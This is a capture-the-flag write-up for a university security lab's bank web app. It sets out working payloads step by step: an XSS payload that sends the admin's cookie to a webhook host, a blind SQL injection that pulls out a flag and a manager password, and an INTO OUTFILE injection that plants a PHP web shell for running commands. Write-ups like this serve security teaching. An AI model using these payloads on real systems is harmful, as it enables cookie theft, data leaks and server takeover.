> Bank – [http://bank.tasks.prak.seclab.cs.msu.ru/](http://bank.tasks.prak.seclab.cs.msu.ru/)

### 1st flag – XSS to steal admin cookie

**Attempts:**
- Tried to send a link with a script to our webhook – nothing arrived.
- Probably the admin checks links or doesn't click them? Maybe a filter?

**Bypass attempt:**
```
http://bank.tasks.prak.seclab.cs.msu.ru/login.php?account_name=%27%3E%3Cscript>location.href=%22https://webhook.site/a2983c50-603d-46c7-9512-f284d82105a4/?%22+document.cookie</script%3E%3Cselect%20name=%27123%27%20&login=&pw=
```
Still nothing – maybe links are not checked at all?

**Working payload (img onerror):**
```
http://bank.tasks.prak.seclab.cs.msu.ru/login.php?account_name=%27%3E%3Cimg%20src%3Dx%20onerror%3D%22this.src%3D%27https%3A%2F%2Fwebhook.site%2Fa2983c50-603d-46c7-9512-f284d82105a4%3Fc%3D%27%2Bdocument.cookie%22%3E&pw=x
```

🎉 **Flag received:** `hey=great_job_but_you_can_go_further__here ...`

---

### 2nd flag – SQL injection in `/parts/`

**Discovery:**  
`/parts/` directory listing → `check-users.inc` file with vulnerable PHP code:
```php
$query_res = mysql_query(
    "SELECT money FROM regular_user_data WHERE id = ".$_REQUEST['client'],
    $db_link
);
```
→ `client` parameter is directly interpolated – SQL injection.

**Behavior:**  
`/check-users.php?client=1` → `"OK, balance is positive."`  
`1 AND 1=1` → positive  
`1 AND 1=2` → error (confirms execution)

**1. Count tables:**
```
http://bank.tasks.prak.seclab.cs.msu.ru/check-users.php?client=1%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.tables%20WHERE%20table_schema=database())%20%3E%20N
```
N = 1,2,3... → **4 tables** (when N=4 → false)

**2. Extract table names (blind, character by character):**
- First determine length: `LENGTH(table_name) = L` → brute force L until true.
- Then each character: `ASCII(SUBSTRING(table_name, pos, 1)) = K`.

Found 4 names, one suspicious: `important_bank_data`

**3. Find flag column in that table:**
```
EXISTS(SELECT * FROM information_schema.columns WHERE table_name='important_bank_data' AND column_name='flag')
```
→ true – column `flag` exists.

**4. Extract flag:**
```
EXISTS(SELECT * FROM important_bank_data WHERE flag LIKE 'main_%')
```
→ true.

**Data retrieved:**
- Table `important_bank_data`:
  - `flag` → `main_f92b94bb47eb3589c64dda32920718`
  - `and_one_more_thing` → `"Great job, thats all with main flags here. You could stop here and move on to the next task. Or go even further and take over the server. There is something waiting for you on a disk, in a file named "flag""`

- Table `managers`:
  - `name` → `manager`
  - `password` → `FHhg_fu43_w9ug34ghdsoz__32h43gh3984gzg4g3`

🎉 **2nd flag obtained.**

---

### 3rd flag – RCE via INTO OUTFILE

**Goal:** Write a PHP shell into the web directory (`/parts/`).

**Payload:**
```
http://bank.tasks.prak.seclab.cs.msu.ru/check-users.php?client=9999%20UNION%20SELECT%20%22%3C%3Fphp%20system(%24_GET%5B%27cmd%27%5D)%3B%20%3F%3E%22%20INTO%20OUTFILE%20%27/var/www/html/parts/shell.php%27
```

**Verify:**
`/parts/shell.php?cmd=ls` → lists files, including `shell.php`.

**Search for the 3rd flag (grep for `main_` across the whole server):**
```
http://bank.tasks.prak.seclab.cs.msu.ru/parts/shell.php?cmd=grep%20-r%20%22main_%22%20/%202%3E/dev/null
```

🎉 **3rd flag found.**

> [!TIP]
> The third flag was located somewhere on the disk – use `grep -r "main_" / 2>/dev/null` to find it.
